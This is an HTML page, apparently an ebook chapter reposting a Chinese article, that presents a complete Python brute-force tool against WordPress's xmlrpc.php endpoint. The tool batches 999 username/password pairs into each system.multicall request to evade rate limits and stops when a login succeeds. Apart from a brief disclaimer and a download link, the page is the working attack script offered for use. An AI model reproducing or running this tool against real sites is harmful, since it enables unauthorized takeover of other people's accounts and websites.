@@ -1,0 +1,112 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>xmlrpc暴力破解脚本[wordpress爆破]</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>xmlrpc暴力破解脚本[wordpress爆破]</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI2MzA3OTgxOA==&amp;mid=400484053&amp;idx=1&amp;sn=1fc46fd10cb41c053813d520cf028e29&amp;chksm=786b14304f1c9d26f299900109660841694fc2a903037ceaa32977c21c90940591fc7829347b&amp;scene=126&amp;sessionid=1681404961#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzI2MzA3OTgxOA==&amp;mid=400484053&amp;idx=1&amp;sn=1fc46fd10cb41c053813d520cf028e29&amp;chksm=786b14304f1c9d26f299900109660841694fc2a903037ceaa32977c21c90940591fc7829347b&amp;scene=126&amp;sessionid=1681404961#wechat_redirect</a></blockquote><p style=""><span style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important; line-height: 25.6px;">以下代码均经过测试，含有攻击性，如有非法攻击行为均由实施运行个人承担。</span></p><p style="">代码运行环境：python</p><p style="">code：</p><p style=""><br/></p><pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; max-width: 100%; color: rgb(62, 62, 62); line-height: 25.6px; widows: auto; box-sizing: border-box !important; word-wrap: break-word !important; background-color: rgb(255, 255, 255);"># coding=utf-8<br/></pre><pre style="margin-top: 0px; margin-bottom: 0px; padding: 0px; max-width: 100%; color: rgb(62, 62, 62); line-height: 25.6px; widows: auto; box-sizing: border-box !important; word-wrap: break-word !important; background-color: rgb(255, 255, 255);">import requests
+import httplib
+import urlparse
+import io
+import argparse
+ 
+ 
+def post(host, pl, port=80,  path='/xmlrpc.php'):
+    postHead = {"Host": host, "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0、c4bbage@weisuo", "X-Forwarded-For": host, 'Content-Type':
+                'application/x-www-form-urlencoded', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Connection': 'keep-alive'}
+    postcontent = '''&lt;?xml version="1.0"?&gt;
+        &lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt; &lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;[pl]     &lt;/data&gt;
+        &lt;/array&gt;   &lt;/value&gt;    &lt;/param&gt;    &lt;/params&gt;    &lt;/methodCall&gt;
+        '''
+    resultHtml = httplib.HTTPConnection(host.split(":")[0], port, False)
+    resultHtml.request(
+        'POST', path, body=postcontent.replace('[pl]', pl), headers=postHead)
+    page = resultHtml.getresponse()
+    pageConect = page.read()
+    return pageConect
+ 
+ 
+def main():
+    parser = argparse.ArgumentParser(
+        description='wordpress brute force tool. This is a multi-group account password request. A request Riga one thousand group account password no problem. Xmlrpc will log a few logs.. \nby c4bbage [url]http://weibo.com/s4turnus'[/url])
+ 
+    parser.add_argument('-t',
+                        action="store",
+                        dest="url",
+                        required=True,
+                        help='exp: -t [url]http://weisuo.org/xmlrpc.php'[/url]
+                        )
+    parser.add_argument('-u',
+                        action="store",
+                        dest="userfile",
+                        required=True,
+                        help='exp: -u username.txt',
+                        type=argparse.FileType('r')
+                        )
+    parser.add_argument('-p',
+                        action="store",
+                        dest="pwdfile",
+                        required=True,
+                        help='exp: -p password.txt',
+                        type=argparse.FileType('r')
+                        )
+ 
+    args = parser.parse_args()
+    url = urlparse.urlparse(args.url)
+    userfile = args.userfile
+    pwdfile = args.pwdfile
+    if(url.netloc.index(':') &gt; 0):
+        urlport = url.netloc.split(":")[1]
+    else:
+        urlport = 80
+    # 每个请求999组账号密码
+    t = 999
+    users = userfile.readlines()
+    pwds = pwdfile.readlines()
+    pl = '''
+    &lt;value&gt;&lt;struct&gt;&lt;member&gt;
+        &lt;name&gt;methodName&lt;/name&gt;
+            &lt;value&gt;&lt;string&gt;wp.getCategories&lt;/string&gt;&lt;/value&gt;
+            &lt;/member&gt;
+        &lt;member&gt;
+        &lt;name&gt;params&lt;/name&gt;
+        &lt;value&gt;&lt;array&gt;&lt;data&gt;
+            &lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;[username]&lt;/string&gt;&lt;/value&gt;
+            &lt;value&gt;&lt;string&gt;[pwd]&lt;/string&gt;&lt;/value&gt;
+        &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;
+    &lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;'''
+ 
+    up = [[u.strip(), p.strip()] for u in users for p in pwds]
+    i = 0
+    apl = ''
+    while i &lt;= len(up) / t:
+        apl = ''
+        s = i * t
+        for a in up[s:s + t]:
+            apl += pl.replace('[username]', a[0]).replace('[pwd]', a[1])
+            pass
+        res = post(host=url.netloc, port=urlport, pl=apl, path=url.path)
+        #   提取结果
+        if(res.find("categoryDescription") &gt; 0):
+            rr = 0
+            for r in res.split("&lt;/struct&gt;&lt;/value&gt;"):
+                if(r.find("categoryDescription") &gt; 0):
+                    print up[s:s + t][rr] 
+                    # 成功后退出
+                    exit()
+                    pass
+                rr += 1
+        i += 1
+        pass
+ 
+if __name__ == '__main__':
+    main()</pre><p style="">遇成功则退出，如果不需要，删除exit()</p><p style=""><br style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;"/></p><p style="">脚本下载地址：http://pan.baidu.com/s/1mg2D4rm</p><p><br/></p>
+        
+</body>
+</html>
